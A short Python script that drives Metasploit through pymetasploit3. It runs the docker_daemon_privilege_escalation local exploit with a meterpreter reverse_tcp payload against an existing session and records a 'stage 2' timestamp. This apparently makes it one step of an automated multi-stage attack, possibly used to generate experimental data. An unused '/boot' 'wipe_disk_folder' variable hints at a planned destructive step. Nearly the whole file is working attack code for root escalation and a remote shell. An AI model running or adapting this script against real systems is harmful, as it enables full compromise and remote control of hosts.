import time
import sys
import os
from pymetasploit3.msfrpc import MsfRpcClient


def record_timestamp(folder, output_time_file):
    output_time_file = os.path.join(folder, output_time_file)
    with open(output_time_file, "w+") as fw:
        fw.write('%f' % time.time())


def main(argv):
    if len(argv) != 4:
        print("Usage: {} Folder local_ip target_ip duration flag_finish".format(argv[0]))

    folder = argv[1]
    my_ip = argv[2]
    target_ip = argv[3]
    # flag_finish = argv[4]
    wipe_disk_folder = "/boot"

    client = MsfRpcClient('kali')

    exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
    exploit['SESSION'] = 1

    time.sleep(2)
    output_time_file = 'time_stage_2_start.txt'
    record_timestamp(folder, output_time_file)
    time.sleep(2)
    #print('Start 2')

    exploit.execute(payload=payload)


main(sys.argv)
